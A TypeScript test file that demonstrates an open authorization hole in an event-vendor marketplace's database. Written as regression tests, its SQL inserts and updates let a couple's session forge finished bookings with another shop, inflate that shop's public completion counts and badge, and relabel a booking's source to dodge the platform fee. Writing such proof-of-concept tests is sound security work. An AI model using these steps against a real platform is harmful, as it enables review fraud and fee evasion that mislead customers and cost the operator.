/**
 * HOLE 1 · A COUPLE CAN FORGE A BOOKING RECORD — PROVEN OPEN (controller sweep 2026-11-16).
 *
 * TESTS ONLY. Every assertion below PASSES WHILE THE HOLE IS OPEN: it performs
 * the exploit as the couple's own `authenticated` session and asserts it works.
 * The fix PR flips each `HOLE OPEN` assertion to its closed form (the write is
 * refused / the forged row is not counted) and renames the file.
 *
 * The policy in question is `event_vendors_couple_write` — FOR ALL, no column
 * list. The guards that DO exist on the row (`guard_event_vendor_lock_handshake`,
 * `guard_event_vendor_completion`, the verified-shop gate) protect the vendor's
 * lock ANSWER columns and the COMPLETION columns. None of them protects:
 *   · `source`, `marketplace_vendor_id`, `linked_vendor_profile_id` — who the
 *     booking is with and how it came about, and
 *   · `status` — a couple may write a row straight to 'delivered'/'complete'
 *     with `lock_agreed_at` NULL: no supplier ever said yes.
 *
 * Two readers then trust the forged row:
 *   · `vendor_public_completed_events_stats` (the public finished-jobs count
 *     behind the experience tier), and
 *   · `shop_booked_loop_count` (the Booked Loop badge).
 * And `booking_fee_attribution_for` reads the forged `source`: a couple can
 * relabel a Setnayan-sourced booking as the supplier's own invite, which is free.
 */
import { test, before, after } from 'node:test';
import assert from 'node:assert/strict';
import type { PGlite } from '@electric-sql/pglite';
import { createReplayedDb, setAuthUid } from './replay-migrations';

let db: PGlite;
let n = 0;

before(async () => {
  db = (await createReplayedDb()).db;
  await reset();
});
after(async () => {
  await db?.close();
});

async function reset(): Promise<void> {
  await db.exec('RESET ROLE').catch(() => {});
  await setAuthUid(db, null).catch(() => {});
  await db.query(`SELECT set_config('request.jwt.claim.role', '', false)`).catch(() => {});
}

async function asCouple(uid: string): Promise<void> {
  await reset();
  await setAuthUid(db, uid);
  await db.query(`SELECT set_config('request.jwt.claim.role', 'authenticated', false)`);
  await db.exec('SET ROLE authenticated');
}

async function newUser(tag: string): Promise<string> {
  const r = await db.query<{ id: string }>(
    `INSERT INTO auth.users (email, raw_user_meta_data) VALUES ($1, jsonb_build_object('account_type','customer')) RETURNING id`,
    [`${tag}-${++n}@hole-1.test`],
  );
  return r.rows[0]!.id;
}

/** A live, verified, publicly listed shop owned by somebody else. */
async function newShop(): Promise<string> {
  const owner = await newUser('shop');
  const r = await db.query<{ vendor_profile_id: string }>(
    `INSERT INTO public.vendor_profiles
       (user_id, business_name, location_city, services, verification_state, last_verified_at, public_visibility)
     VALUES ($1, $2, 'Manila', ARRAY['catering']::text[], 'verified', NOW(), 'verified')
     RETURNING vendor_profile_id`,
    [owner, `Kusina ni Juan ${n}`],
  );
  return r.rows[0]!.vendor_profile_id;
}

async function newCoupleEvent(couple: string): Promise<string> {
  const r = await db.query<{ event_id: string }>(
    `INSERT INTO public.events (display_name, event_type) VALUES ($1, 'birthday') RETURNING event_id`,
    [`Hole 1 ${++n}`],
  );
  const eventId = r.rows[0]!.event_id;
  await db.query(`INSERT INTO public.event_members (event_id, user_id, member_type) VALUES ($1, $2, 'couple')`, [
    eventId,
    couple,
  ]);
  return eventId;
}

async function publicCompleted(shop: string): Promise<number> {
  await reset();
  await db.exec('REFRESH MATERIALIZED VIEW public.vendor_public_completed_events_stats');
  const r = await db.query<{ c: number }>(
    `SELECT public_completed_count AS c FROM public.vendor_public_completed_events_stats WHERE vendor_profile_id = $1`,
    [shop],
  );
  return r.rows[0]?.c ?? 0;
}

async function loopCount(shop: string): Promise<number> {
  await reset();
  const r = await db.query<{ c: number }>(`SELECT public.shop_booked_loop_count($1) AS c`, [shop]);
  return r.rows[0]!.c;
}

test('HOLE OPEN · 1a — a couple INSERTs a finished booking with another shop, no supplier yes, and both public counters count it', async () => {
  const shop = await newShop();
  const couple = await newUser('couple');
  const events = [await newCoupleEvent(couple), await newCoupleEvent(couple)];

  assert.equal(await publicCompleted(shop), 0, 'precondition: the shop starts with no finished jobs');
  assert.equal(await loopCount(shop), 0, 'precondition: the shop starts with no booked loop');

  for (const eventId of events) {
    await asCouple(couple);
    const out = await db
      .query<{ status: string; lock_agreed_at: string | null; source: string }>(
        `INSERT INTO public.event_vendors
           (event_id, category, vendor_name, status, marketplace_vendor_id, linked_vendor_profile_id, source)
         VALUES ($1, 'catering', 'Kusina ni Juan', 'complete', $2, $2, 'host_marketplace_search')
         RETURNING status, lock_agreed_at, source`,
        [eventId, shop],
      )
      .then((r) => r.rows[0]!)
      .catch((e: Error) => e.message);
    await reset();
    // HOLE OPEN: the couple's own session wrote it. Fix flips to: refused (42501).
    assert.equal(typeof out, 'object', `HOLE CLOSED? the forged insert was refused: ${String(out)}`);
    const row = out as { status: string; lock_agreed_at: string | null; source: string };
    assert.equal(row.status, 'complete');
    assert.equal(row.lock_agreed_at, null, 'no supplier ever agreed — the server stamped nothing');
    assert.equal(row.source, 'host_marketplace_search', 'the couple chose the provenance');
  }

  // HOLE OPEN: the forged rows count. Fix flips both to 0.
  assert.equal(await publicCompleted(shop), 2, 'vendor_public_completed_events_stats counts the forged finished jobs');
  assert.equal(await loopCount(shop), 1, 'shop_booked_loop_count counts the forged repeat family');
});

test('HOLE OPEN · 1b — a couple UPDATEs their own plain row into another shop\'s delivered booking', async () => {
  const shop = await newShop();
  const couple = await newUser('couple');
  const eventId = await newCoupleEvent(couple);
  const before = await publicCompleted(shop);

  await asCouple(couple);
  const ins = await db.query<{ vendor_id: string }>(
    `INSERT INTO public.event_vendors (event_id, category, vendor_name, status)
     VALUES ($1, 'catering', 'Just a name I typed', 'considering') RETURNING vendor_id`,
    [eventId],
  );
  const rowId = ins.rows[0]!.vendor_id;
  const out = await db
    .query(
      `UPDATE public.event_vendors
          SET marketplace_vendor_id = $2, linked_vendor_profile_id = $2,
              source = 'host_marketplace_search', status = 'delivered'
        WHERE vendor_id = $1
        RETURNING status, lock_agreed_at`,
      [rowId, shop],
    )
    .then((r) => (r.rows.length === 1 ? 'ok' : `no row (${r.rows.length})`))
    .catch((e: Error) => e.message);
  await reset();

  // HOLE OPEN: repointed + moved to delivered with no handshake. Fix flips to: refused.
  assert.equal(out, 'ok', `HOLE CLOSED? the repoint/status update was refused: ${out}`);
  const r = await db.query<{ lock_agreed_at: string | null; lock_request_state: string | null }>(
    `SELECT lock_agreed_at, lock_request_state FROM public.event_vendors WHERE vendor_id = $1`,
    [rowId],
  );
  assert.equal(r.rows[0]!.lock_agreed_at, null, 'delivered with no supplier yes');
  assert.equal(await publicCompleted(shop), before + 1, 'the repointed row is counted as the shop\'s finished job');
});

test('HOLE OPEN · 1c — a couple relabels a Setnayan-sourced booking as the supplier\'s own invite, and the fee becomes import', async () => {
  const shop = await newShop();
  const couple = await newUser('couple');
  const eventId = await newCoupleEvent(couple);

  await asCouple(couple);
  const ins = await db.query<{ vendor_id: string }>(
    `INSERT INTO public.event_vendors (event_id, category, vendor_name, status, marketplace_vendor_id, source)
     VALUES ($1, 'catering', 'Kusina ni Juan', 'considering', $2, 'host_marketplace_search') RETURNING vendor_id`,
    [eventId, shop],
  );
  const rowId = ins.rows[0]!.vendor_id;
  await reset();
  const attr = async () =>
    (await db.query<{ a: string }>(`SELECT public.booking_fee_attribution_for($1, $2) AS a`, [shop, eventId])).rows[0]!.a;
  assert.equal(await attr(), 'sourced', 'precondition: a save from Find is Setnayan-sourced');

  await asCouple(couple);
  const out = await db
    .query(`UPDATE public.event_vendors SET source = 'vendor_invite' WHERE vendor_id = $1 RETURNING vendor_id`, [rowId])
    .then((r) => (r.rows.length === 1 ? 'ok' : `no row (${r.rows.length})`))
    .catch((e: Error) => e.message);
  await reset();

  // HOLE OPEN: the couple rewrote provenance and the fee follows it. Fix flips to: refused, still 'sourced'.
  assert.equal(out, 'ok', `HOLE CLOSED? the source rewrite was refused: ${out}`);
  assert.equal(await attr(), 'import', 'booking_fee_attribution_for reads the couple-written source');
});
